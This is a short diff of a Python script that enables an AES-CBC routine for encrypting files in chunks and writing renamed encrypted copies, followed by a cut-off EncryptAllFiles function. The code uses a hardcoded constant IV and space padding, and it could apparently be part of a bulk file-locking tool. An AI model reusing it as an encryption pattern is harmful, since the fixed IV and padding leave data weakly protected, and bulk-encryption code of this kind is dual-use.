@@ -19,23 +19,22 @@ def EncryptFile(fileToEncrypt, key):
     dir_path, file_name = os.path.split(fileToEncrypt)
     
     iv = "A3DKWIEAA3DKWIEA"
-    print("xxxxxxxxxxxxxxxxxxx: " + iv)
 
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
 
-    # with open(fileToEncrypt, 'rb') as infile:
-    #     with open(os.path.join(dir_path, encrypted_symbol + file_name), 'wb') as outfile:
-    #         outfile.write(file_size.encode('utf-8'))
-    #         outfile.write(iv)
+    with open(fileToEncrypt, 'rb') as infile:
+        with open(os.path.join(dir_path, encrypted_symbol + file_name), 'wb') as outfile:
+            outfile.write(file_size.encode('utf-8'))
+            outfile.write(iv)
 
-    #         while True:
-    #             chunk = infile.read(64 * 1024)
-    #             if len(chunk) == 0:
-    #                 break
-    #             elif len(chunk) % 16 != 0:
-    #                 chunk += b' ' * (16 - (len(chunk) % 16))
+            while True:
+                chunk = infile.read(64 * 1024)
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b' ' * (16 - (len(chunk) % 16))
 
-    #             outfile.write(aes_obj.encrypt(chunk))
+                outfile.write(aes_obj.encrypt(chunk))
     pass
 
 def EncryptAllFiles(filesToEncrypt, key):
